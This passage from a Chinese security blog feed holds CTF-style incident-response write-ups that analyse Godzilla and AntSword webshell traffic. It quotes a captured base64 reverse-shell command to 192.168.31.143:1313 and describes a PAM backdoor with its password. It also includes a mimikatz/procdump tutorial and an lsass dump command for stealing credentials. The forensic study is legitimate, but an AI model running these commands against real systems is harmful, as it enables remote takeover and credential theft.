RWX</span><br><span class="line">vmlinuz 1 2023-08-07 22:35:25 5283136 RW</span><br><span class="line">opt 0 2024-09-19 08:41:28 4096 RWX</span><br><span class="line">mnt 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">etc 0 2024-09-19 07:35:49 4096 RWX</span><br><span class="line">root 0 2024-09-19 08:41:48 4096 RWX</span><br><span class="line">srv 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">proc 0 2024-09-19 06:29:54 0 RWX</span><br><span class="line">dev 0 2024-09-19 06:29:58 3160 RWX</span><br><span class="line">initrd.img.old 1 2023-12-25 02:32:56 28089917 RW</span><br><span class="line">initrd.img 1 2023-12-25 02:34:12 28246009 RW</span><br><span class="line">vmlinuz.old 1 2020-07-24 14:46:18 5274864 RW</span><br><span class="line">var 0 2023-12-25 02:31:52 4096 RWX</span><br><span class="line">wget-log.1 1 2024-09-19 08:15:47 0 RW</span><br><span class="line">lib64 0 2024-09-18 08:05:13 4096 RWX</span><br><span class="line">media 0 2023-12-25 02:31:45 4096 RWX</span><br><span class="line">boot 0 2023-12-25 02:41:35 1024 RWX</span><br><span class="line">tmp 0 2024-09-19 09:00:35 4096 RWX</span><br><span class="line">run 0 2024-09-19 09:00:35 600 RWX</span><br><span class="line">wget-log.2 1 2024-09-19 08:15:47 0 RW</span><br><span class="line">home 0 2023-12-25 02:43:00 4096 RWX</span><br><span class="line">bin 0 2024-09-19 07:35:48 28672 RWX</span><br><span class="line">sys 0 2024-09-19 06:29:55 0 RWX</span><br></pre></td></tr></table></figure><p><strong>数据流55</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">methodName  getFiledirName  /tmp/</span><br><span class="line">响应</span><br><span class="line">ok</span><br><span class="line">/tmp/</span><br><span class="line">ssh-rJgBkHZMg0 0 2024-09-19 08:30:00 4096 RWX</span><br><span class="line">code-8a1ad303-d54a-4ee6-bf06-79c09e867bed 1 2024-09-19 08:15:43 0 RWX</span><br><span class="line">.XIM-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">ssh-vWnAfxielC 0 2024-09-19 08:43:32 4096 RWX</span><br><span class="line">ssh-HqBIxaU2OF 0 2024-09-19 08:15:37 4096 RWX</span><br><span class="line">hsperfdata_root 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">systemd-private-fe1119a9e31340ada72ff5bdd7dcb056-systemd-timesyncd.service-wVf4Jf 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">1.pcap 1 2024-09-19 09:03:14 1490944 RW</span><br><span class="line">.Test-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">.X11-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">.ICE-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">.font-unix 0 2024-09-19 06:29:59 4096 RWX</span><br><span class="line">ssh-P22RjIKAZ3 0 2024-09-19 08:19:17 4096 RWX</span><br><span class="line">ssh-F8xrTEcjZ2 0 2024-09-19 08:39:58 4096 RWX</span><br><span class="line">ssh-JmgaMLTFgu 0 2024-09-19 08:21:23 4096 RWX</span><br><span class="line">ssh-r6qMz7wlBA 0 2024-09-19 09:00:35 4096 RWX</span><br></pre></td></tr></table></figure><p><strong>数据流56</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">fileName  /tmp/pam_unix.sofileValue NELF</span><br><span class="line">响应</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p><strong>数据流57</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">cmdLine l  sh -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-3  2&gt;&amp;1executableFile  shexecutableArgs i  -c &quot;cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bash&quot; 2&gt;&amp;1arg-0  shargsCount  4arg-1  -carg-2 _  cd &quot;/&quot;;echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==|base64 -d|bashmethodName  execCommand</span><br><span class="line">响应</span><br><span class="line">空</span><br></pre></td></tr></table></figure><p>分析数据流46，前面的<code>cmdLine  sh -c &quot;cd &quot;/&quot;</code>是哥斯拉自动执行的，后面的<code>uname -r</code>是攻击者执行的，因此答案就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;uname -r&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-7"><a href="#步骤-7" class="headerlink" title="步骤#7"></a>步骤#7</h3><p><strong>黑客连接webshell时查询当前shell的权限是什么？</strong></p><p>由步骤六的<strong>数据流47</strong>可知，攻击者执行了命令<code>id</code>，用于查询<strong>用户和用户组相关的身份信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><p>因此当前shell的权限就是root</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;root&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-8"><a href="#步骤-8" class="headerlink" title="步骤#8"></a>步骤#8</h3><p><strong>黑客利用webshell执行命令查询服务器Linux系统发行版本是什么？</strong></p><p>分析步骤六中的数据流，发现<strong>数据流48</strong>运行了命令<code>cat /etc/os-release</code>，该命令主要作用是<strong>查看 Linux 操作系统的详细版本和发行相关信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;</span><br><span class="line">NAME=&quot;Debian GNU/Linux&quot;</span><br><span class="line">VERSION_ID=&quot;10&quot;</span><br><span class="line">VERSION=&quot;10 (buster)&quot;</span><br><span class="line">VERSION_CODENAME=buster</span><br><span class="line">ID=debian</span><br><span class="line">HOME_URL=&quot;https://www.debian.org/&quot;</span><br><span class="line">SUPPORT_URL=&quot;https://www.debian.org/support&quot;</span><br><span class="line">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;</span><br></pre></td></tr></table></figure><p>因此答案就是PRETTY_NAME的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Debian GNU/Linux 10 (buster)&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-9"><a href="#步骤-9" class="headerlink" title="步骤#9"></a>步骤#9</h3><p><strong>黑客利用webshell执行命令还查询并过滤了什么？（提交整条执行成功的命令）</strong></p><p><strong>数据流49</strong>，攻击者先是<strong>错误地</strong>输入了 <code>rmp</code>，发现命令不存在</p><p>然后<strong>数据流50</strong>中攻击者修正了命令为 <code>rpm</code>，执行<code>rpm -qa | grep pam</code>，但是返回结果仍显示not found</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2&gt;&amp;1: 1: 2&gt;&amp;1: rpm: not found</span><br></pre></td></tr></table></figure><p>rpm命令是用于管理RPM包的命令行工具，这个命令是在查询pam相关的包，pam模块与Linux的用户认证有关，是一个非常敏感和危险的位置</p><p>在<strong>数据流51</strong>，攻击者根据之前的失败，推断出这不是一个基于RPM的系统（如CentOS），转而使用Debian&#x2F;Ubuntu系的 <code>dpkg</code> 命令进行查询，并<strong>成功</strong>获取了信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Desired=Unknown/Install/Remove/Purge/Hold</span><br><span class="line">| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend</span><br><span class="line">|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)</span><br><span class="line">||/ Name                 Version      Architecture Description</span><br><span class="line">+++-====================-============-============-========================================</span><br><span class="line">ii  libpam-modules:amd64 1.3.1-5      amd64        Pluggable Authentication Modules for PAM</span><br></pre></td></tr></table></figure><p>攻击者执行成功的命令就是<code>dpkg -l libpam-modules:amd64</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dpkg -l libpam-modules:amd64&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-10"><a href="#步骤-10" class="headerlink" title="步骤#10"></a>步骤#10</h3><p><strong>黑客留下后门的反连的IP和PORT是什么？（IP:PORT)</strong></p><p><strong>数据流52</strong>中的请求体中存在base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMTQzLzEzMTMgMD4mMQ==</span><br></pre></td></tr></table></figure><p>解码后得到结果为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804200512400.png"></p><p>很明显，这个就是反连命令，因此IP是192.168.31.143，端口为1313</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.31.143:1313&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-11"><a href="#步骤-11" class="headerlink" title="步骤#11"></a>步骤#11</h3><p><strong>黑客通过什么文件留下了后门？</strong></p><p>继续分析<strong>步骤六</strong>中的数据包，发现<strong>数据流56</strong>跟文件相关</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">请求</span><br><span class="line">fileName  /tmp/pam_unix.sofileValue NELF</span><br><span class="line">响应</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p>攻击者上传了一个恶意的PAM模块文件 <code>pam_unix.so</code>。该方法攻击原理是，用这个恶意文件替换掉Linux系统中负责密码验证的核心模块，从而植入一个“万能密码”（例如 <code>password123</code>）或“后门用户”（无论输入什么密码都能成功），从而实现对系统身份认证机制的劫持</p><p>可以看到攻击者上传路径为<code>/tmp/pam_unix.so</code>，这个先记住，后面有用</p><p>因此后门文件就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;pam_unix.so&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-12"><a href="#步骤-12" class="headerlink" title="步骤#12"></a>步骤#12</h3><p><strong>黑客设置的后门密码是什么？</strong></p><p>连接到玄机靶场机器，进去后执行<code>history</code>查看攻击者执行的历史命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804202718732.png"></p><p>可以看到，攻击者先将系统正常的用户密码认证模块（<code>pam_unix.so</code>）备份成一个隐藏文件，然后用自己上传的、含有后门功能的同名恶意文件（<code>/tmp/pam_unix.so</code>）替换掉原始文件（<code>/lib/x86_64-linux-gnu/security/pam_unix.so</code>）</p><p>直接在<code>/tmp</code>里面查找会找不到<code>pam_unix.so</code>，估计是攻击者删除了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804203050795.png"></p><p>那我们去<code>/lib/x86_64-linux-gnu/security</code>目录查找，成功找到目标文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804203147348.png"></p><p>将<code>pam_unix.so</code>拷贝下来，用IDA进行静态分析</p><p><code>pam_sm_authenticate</code> 是 Linux PAM（可插拔认证模块，Pluggable Authentication Modules）中<strong>认证服务模块的核心函数</strong>，专门用于<strong>验证用户身份</strong></p><p>因此我们找到函数<code>pam_sm_authenticate</code>进行分析，成功获得后门密码<code>XJ@123</code></p><p><img src="https://oss.waynejoons.icu/picphoto/20250804204858805.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;XJ@123&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-13"><a href="#步骤-13" class="headerlink" title="步骤#13"></a>步骤#13</h3><p><strong>黑客的恶意dnslog服务器地址是什么？</strong></p><p>wireshark语法搜索dns，可以找到黑客的恶意dnslog服务器地址，但是要注意这个地址后面有个点号（后面分析IDA发现的）</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804201612169.png"></p><p>或者可以通过IDA分析<code>pam_sm_authenticate</code>认证函数来获取dnslog地址</p><p><img src="https://oss.waynejoons.icu/picphoto/20250804204959776.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c0ee2ad2d8.ipv6.xxx.eu.org.&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>momo安全：<a href="https://mp.weixin.qq.com/s/rhPT5H0IZ4nm6JcgacRg8Q">https://mp.weixin.qq.com/s/rhPT5H0IZ4nm6JcgacRg8Q</a></p>]]></content>
    
    
    <summary type="html">哥斯拉4.0流量分析详解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 流量特征分析-蚂蚁爱上树</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-and-Mimikatz/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-and-Mimikatz/</id>
    <published>2025-07-31T14:29:18.000Z</published>
    <updated>2025-07-31T14:31:00.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>玄机靶场日常刷题训练，刚好重温一下蚁剑流量分析和mimikatz用法</p><h2 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h2><h3 id="蚁剑流量特征"><a href="#蚁剑流量特征" class="headerlink" title="蚁剑流量特征"></a>蚁剑流量特征</h3><p>每个请求体通常以<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>开头</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730181924464.png"></p><p>请求体包含<strong>base64编码</strong>内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182041300.png"></p><p>响应包一般是明文，但也可能存在加密情况，结果通常为<strong>随机字符和返回结果</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182310332.png"></p><p><strong>Content-Type</strong>通常为 <code>application/x-www-form-urlencoded</code>，表明数据是以标准表单形式编码的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182726797.png"></p><h3 id="mimikatz简单用法"><a href="#mimikatz简单用法" class="headerlink" title="mimikatz简单用法"></a>mimikatz简单用法</h3><p><strong>先用procdump抓取lsass转储文件</strong></p><ol><li>获取lsass进程id</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr lsass.exe</span><br></pre></td></tr></table></figure><ol start="2"><li>抓取 <code>lsass.dmp</code> 文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma &lt;LSASS_PID&gt; lsass.dmp</span><br></pre></td></tr></table></figure><p><strong>然后mimikatz解密lsass.dmp文件</strong></p><ol><li>特权提升</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br></pre></td></tr></table></figure><ol start="2"><li>加载dmp文件</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::minidump lsass.dmp</span><br></pre></td></tr></table></figure><ol start="3"><li>凭据提取，导出其中的明文密码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250731213448489.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>管理员Admin账号的密码是什么？</strong></p><p>首先通过语法筛选出http流量并过滤掉404状态码的流量包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and !(http.response.code == 404)</span><br></pre></td></tr></table></figure><p>然后快速分析一遍流量，发现product2.php有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731200431030.png"></p><p>这里涉及到一句话木马，可以确定这个就是webshell文件，然后解码请求包的base64内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731200641658.png"></p><p>左下解码处选择<strong>Base64</strong>，可以看到解码后的内容符合蚁剑特征，因此确定这是以蚁剑为媒介的一次攻击行为</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731200913454.png"></p><p>因为蚁剑与网站是通过POST方法进行通信的，所以我们重新改进一下筛选语法，直接筛选出方法为POST且包含文件名product2.php的流量，可以缩小分析范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == POST and http.request.uri contains &quot;product2.php&quot;</span><br></pre></td></tr></table></figure><p>逐个分析流量，<strong>解码base64数据</strong>，因为蚁剑的特性，前两位是随机值，所以<strong>开始位置调整为2</strong>，最后发现<strong>No.15190数据包</strong>有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731202612885.png"></p><p>执行了系统命令<code>net user admin Password1 /add</code>，也就是添加一个名为admin的用户，然后密码设置为Password1，但是此时该用户并不是管理员，分析下一个数据包，可以看到</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731203210396.png"></p><p>攻击者将admin用户添加进本地管理员组，从此刻起该用户admin才具有管理员权限</p><p>因此答案就是这个用户的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Password1&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>LSASS.exe的程序进程ID是多少？</strong></p><p>继续分析流量，发现<strong>No.4069数据包</strong>有问题</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731210814888.png"></p><p>可以看到攻击者执行了命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe comsvcs.dll, MiniDump 852 C:\Temp\OnlineShopBackup.zip full</span><br></pre></td></tr></table></figure><p>我们分析一下</p><ul><li><p><strong>rundll32.exe</strong>: 这是一个 Windows 系统程序，用于运行 DLL（动态链接库）文件中的函数。它本身不执行任何操作，而是作为调用 DLL 函数的宿主</p></li><li><p><strong>comsvcs.dll</strong>: 这是一个系统 DLL 文件，包含了 COM+ 服务相关的函数。在这个命令中，它被用来调用其内部的 <code>MiniDump</code> 函数</p></li><li><p><strong>MiniDump</strong>: 这是 <code>comsvcs.dll</code> 中的一个函数，用于创建指定进程的内存转储。内存转储是进程在某个时间点的内存快照，通常用于调试或故障排除</p></li><li><p><strong>852</strong>: 这是要进行内存转储的进程的 <strong>PID（进程 ID）</strong></p></li><li><p><strong>C:\Temp\OnlineShopBackup.zip</strong>: 这是内存转储文件的输出路径和文件名。尽管文件名是 <code>.zip</code>，但它实际上是一个原始的内存转储文件，并不是一个压缩文件</p></li><li><p><strong>full</strong>: 这是一个参数，指定了内存转储的类型。表示创建一个完整的内存转储，包含进程的所有内存信息。其他参数还包括 <code>mini</code> (较小的转储) 或 <code>heap</code> (只包含堆信息) 等</p></li></ul><p>简而言之，这条命令就是先找到 PID 为 <strong>852</strong> 的进程，然后创建一个该进程的<strong>完整内存快照</strong>，并将这个内存快照保存到<code>C:\Temp\OnlineShopBackup.zip</code>文件中</p><p>因此LSASS.exe的程序进程ID就是852</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;852&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>用户WIN101的密码是什么?</strong></p><p>要获取用户WIN101的密码，需要我们把前面提到的<strong>完整内存快照</strong>下载下来，也就是<strong>OnlineShopBackup.zip</strong>，然后用<strong>mimikatz</strong>分析</p><p>因此我们需要导出http对象</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731212240680.png"></p><p>文本过滤器输入product2.php，缩小对象范围，同时按照大小降序来排列，因为dmp文件比较大</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731212726860.png"></p><p>可以看到第一个文件大小为47MB，就是我们要找的dmp文件，导出到桌面，用010editor打开验证</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731213829620.png"></p><p>开头显示MDMP，可以确定是dmp文件，但是前面多了<strong>e1c1709</strong>这几个字符，直接放入mimikatz解密会报错，因此需要先删掉，然后将文件后缀改为dmp，放到跟mimikatz同一个目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731215021947.png"></p><p>记得mimikatz<strong>以管理员身份运行</strong></p><p>运行命令获取系统密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump product2.dmp</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>然后找到用户名为win101的NTLM哈希值</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731215249596.png"></p><p>得到哈希值为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">282d975e35846022476068ab5a3d72df</span><br></pre></td></tr></table></figure><p>对NTLM的md5解密即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250731215538646.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;admin#123&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>momo安全：<a href="https://mp.weixin.qq.com/s/KgkilGEUmle5P_KvzAjDmw">https://mp.weixin.qq.com/s/KgkilGEUmle5P_KvzAjDmw</a></p>]]></content>
    
    
    <summary type="html">流量特征分析-蚂蚁爱上树详细题解</summary>
    
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 蚁剑流量分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-Traffic-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-AntSword-Traffic-Analysis/</id>
    <published>2025-07-30T13:57:39.000Z</published>
    <updated>2025-07-30T14:37:56.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是蚁剑"><a href="#什么是蚁剑" class="headerlink" title="什么是蚁剑"></a>什么是蚁剑</h2><p>蚁剑（AntSword）是一款开源的网络安全工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员，常用于网络渗透测试，可以远程连接被攻击的计算机，进行文件上传下载、执行系统命令等操作</p><p>蚁剑下载地址：<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><h2 id="蚁剑流量特征"><a href="#蚁剑流量特征" class="headerlink" title="蚁剑流量特征"></a>蚁剑流量特征</h2><p>每个请求体通常以<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);</code>开头</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730181924464.png"></p><p>请求体包含<strong>base64编码</strong>内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182041300.png"></p><p>响应包一般是明文，但也可能存在加密情况，结果通常为<strong>随机字符和返回结果</strong></p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182310332.png"></p><p><strong>Content-Type</strong>通常为 <code>application/x-www-form-urlencoded</code>，表明数据是以标准表单形式编码的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182726797.png"></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250730181626135.png"></p><h2 id="玄机题目"><a href="#玄机题目" class="headerlink" title="玄机题目"></a>玄机题目</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>木马的连接密码是多少</strong></p><p>首先输入http筛选出http协议流量包，这些内容就是我们要分析的流量了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730182915270.png"></p><p>随便点开一个请求的内容，例如第一个请求包，观察发包内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730183101974.png"></p><p>这里面的key就是木马的连接密码，为“1”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>黑客执行的第一个命令是什么</strong></p><p>点开第一个流量包，查看请求内容，选择最后一个item的value值，点击“显示分组字节流”</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730183629715.png"></p><p>因为是base64编码，因此需要在左下<strong>选择Base64解码</strong>，由于蚁剑的特征，前两位是随机值，所以<strong>开始位置调整为“2”</strong>，成功得到执行命令</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730183900592.png"></p><p>结合响应内容可知，第一个执行的命令为<strong>id</strong>，为什么不是<code>cd &quot;/var/www/html&quot;</code>呢，因为这是蚁剑自动执行的，表示攻击者是在&#x2F;var&#x2F;www&#x2F;html执行命令的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730185813544.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;id&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>黑客读取了哪个文件的内容，提交文件绝对路径</strong></p><p>分析到第三个响应包时，发现返回内容为&#x2F;etc&#x2F;passwd</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730190334812.png"></p><p>查看第三个请求包，方法跟步骤2一样，也是点开“显示分组字节流”，调整开始位置为“2”，解码为“Base64”，可以看到执行了命令<code>cat /etc/passwd</code>，因此答案就是这个</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730190447902.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;/etc/passwd&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>黑客上传了什么文件到服务器，提交文件名</strong></p><p>分析到第四个响应包时，发现返回内容很短，跟其他流量包的内容差距较大，可以猜测出这是文件上传后的响应内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730190910833.png"></p><p>跟之前一样，我们看看第四个请求包内容，解码可以得到上传的文件名</p><p><img src="https://oss.waynejoons.icu/picphoto/20250730191252838.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 